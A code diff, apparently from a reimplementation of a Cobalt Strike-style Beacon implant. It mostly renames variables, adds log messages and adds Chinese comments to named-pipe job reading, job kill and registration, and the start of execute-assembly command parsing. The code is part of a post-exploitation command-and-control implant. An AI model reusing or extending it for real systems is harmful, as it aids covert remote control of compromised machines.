@@ -121,21 +121,24 @@ DWORD JobReadDataFromPipe(HANDLE hPipe, unsigned char* buffer, int size)
 		return -1;
 	}
 
-	DWORD read = 0;
+	DWORD NumberOfBytesRead = 0;
 	DWORD totalRead = 0;
 
 	while (totalBytesAvail)
 	{
-		if (totalRead >= size)
+		if (totalRead >= size) {
+			fprintf(stdout, "Read header size failed or header size too large than post packet, so enough.\n");
 			break;
+		}
 
-		if (!ReadFile(hPipe, buffer, size - totalRead, &read, NULL)) {
+		// 能读多少读多少
+		if (!ReadFile(hPipe, buffer, size - totalRead, &NumberOfBytesRead, NULL)) {
 			fprintf(stderr, "ReadFile failed with error:%lu\n", GetLastError());
 			return -1;
 		}
 
-		totalRead += read;
-		buffer += read;
+		totalRead += NumberOfBytesRead;
+		buffer += NumberOfBytesRead;
 
 		if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &totalBytesAvail, NULL)) {
 			fprintf(stderr, "PeekNamePipe failed with error:%lu\n", GetLastError());
@@ -151,29 +154,35 @@ DWORD JobReadDataFromPipeWithHeader(HANDLE hPipe, unsigned char* buffer, int siz
 	DWORD lpTotalBytesAvail;
 	DWORD headerSize = 0;
 
-	if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &lpTotalBytesAvail, NULL))
+	if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &lpTotalBytesAvail, NULL)) {
+		fprintf(stderr, "PeekNamePipe failed with error:%lu\n", GetLastError());
 		return -1;
+	}
 
-	if (!lpTotalBytesAvail)
-		return 0;
+	if (!lpTotalBytesAvail) {
+		fprintf(stdout, "No data available in pipe\n");
+	}
 
-	if (ProtocolSmbPipeRead(hPipe, (unsigned char*)&headerSize, sizeof(headerSize)) != sizeof(headerSize) || headerSize > size)
+	// 先从管道读取大小
+	if (ProtocolSmbPipeRead(hPipe, (unsigned char*)&headerSize, sizeof(headerSize)) != sizeof(headerSize) || headerSize > size) {
+		fprintf(stderr, "Read header size failed or header size too large than post packet\n");
 		return -1;
+	}
 
 	return ProtocolSmbPipeRead(hPipe, buffer, headerSize);
 }
 
 int ProtocolSmbPipeRead(HANDLE channel, unsigned char* buffer, int length)
 {
-	int read, totalRead;
-	for (totalRead = 0; totalRead < length; totalRead += read)
+	int NumberOfBytesRead, totalRead;
+	for (totalRead = 0; totalRead < length; totalRead += NumberOfBytesRead)
 	{
-		if (!ReadFile(channel, buffer + totalRead, length - totalRead, &read, NULL)) {
+		if (!ReadFile(channel, buffer + totalRead, length - totalRead, &NumberOfBytesRead, NULL)) {
 			fprintf(stderr, "ReadFile failed with error:%lu\n", GetLastError());
 			return -1;
 		}
 
-		if (read == 0)
+		if (NumberOfBytesRead == 0)
 			return -1;
 	}
 
@@ -189,7 +198,7 @@ void ProcessJobEntry(int max) {
 	* 必须为有符号
 	* 在JobReadDataFromPipeWithHeader 
 	* JobReadDataFromPipe 中 直接返回了 -1 无符号表示为0xFFFFFFFF
-	* 判断 totalRead 就会大于 0、
+	* 判断 totalRead 就会大于 0
 	* 传入到 DataProcess 中就为 0xFFFFFFFF 
 	* 从而在 DataProcess 引发访问边界错误
 	*/
@@ -200,10 +209,17 @@ void ProcessJobEntry(int max) {
 	if(tmpJob == NULL)
 		return;
 
-	buf = (unsigned char*)malloc(sizeof(char) * max);
+	buf = (unsigned char*)malloc(sizeof(unsigned char) * max);
 
 	while (tmpJob) {
 		// 判断数据类型
+		/*
+		* JOB_MODE_MESSAGE 指的是读取带有头部长度的消息
+		* 每次读取的是一个固定大小
+		*/
+		/*
+		* JobReadDataFromPipe对应的读取方式为字节流(stream) 有多少读多少
+		*/
 		if (tmpJob->isMsgMode == JOB_MODE_MESSAGE) {
 			totalRead = JobReadDataFromPipeWithHeader(tmpJob->hRead, buf, max);
 		}
@@ -260,9 +276,9 @@ unsigned char* CmdJobList(size_t* msgLen) {
 	return postMsg;
 }
 
-unsigned char* CmdJobKill(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLength) {
+unsigned char* CmdJobKill(unsigned char* command, size_t command_length, size_t* msgLength) {
 	datap parser;
-	BeaconDataParse(&parser, commandBuf, commandBuflen);
+	BeaconDataParse(&parser, command, command_length);
 	WORD id = BeaconDataShort(&parser);
 	BOOL Flag = FALSE;
 
@@ -295,7 +311,7 @@ unsigned char* CmdJobKill(unsigned char* commandBuf, size_t commandBuflen, size_
 		}
 		memcpy(postMsg, fail, strlen(fail));
 		*msgLength = strlen(fail);
-		postMsg[*msgLength] = '\0';
+		postMsg[strlen(fail)] = '\0';
 	}
 
 	JobCleanup();
@@ -303,13 +319,13 @@ unsigned char* CmdJobKill(unsigned char* commandBuf, size_t commandBuflen, size_
 	return postMsg;
 }
 
-VOID CmdJobRegister(unsigned char* commandBuf, size_t commandBuflen, BOOL impersonate, BOOL isMsgMode)
+VOID CmdJobRegister(unsigned char* command, size_t command_length, BOOL impersonate, BOOL isMsgMode)
 {
 	char filename[64] = { 0 };
 	char description[64] = { 0 };
 
 	datap parser;
-	BeaconDataParse(&parser, commandBuf, commandBuflen);
+	BeaconDataParse(&parser, command, command_length);
 	int pid32 = BeaconDataInt(&parser);              // 4 bytes
 	short callbackType = BeaconDataShort(&parser);   // 2 bytes
 	short waitTime = BeaconDataShort(&parser);       // 2 bytes
@@ -340,13 +356,13 @@ VOID CmdJobRegister(unsigned char* commandBuf, size_t commandBuflen, BOOL impers
 	JobRegisterPipe(hPipe, pid32, callbackType, description, isMsgMode);
 }
 
-VOID CmdExecuteAssembly(unsigned char* commandBuf, size_t commandBuflen) {
+VOID CmdExecuteAssembly(unsigned char* command, size_t command_length) {
 	// 数据包格式：callbackType(2 Bytes) || waitTime(2 Bytes) || offset(4 Bytes) || description || arguLength(4 Bytes) || argument(arguLength Bytes) || patchDll(patchDllSize Bytes)
 	datap* desc = BeaconDataAlloc(64);
 	unsigned char* description = BeaconDataPtr(desc, 64);
 
 	datap parser;
-	BeaconDataParse(&parser, commandBuf, commandBuflen);
+	BeaconDataParse(&parser, command, command_length);
 	WORD callbackType = BeaconDataShort(&parser); // 2 Bytes
 	WORD waitTime = BeaconDataShort(&parser);     // 2 Bytes
 	DWORD offset = BeaconDataInt(&parser);        // 4 Bytes
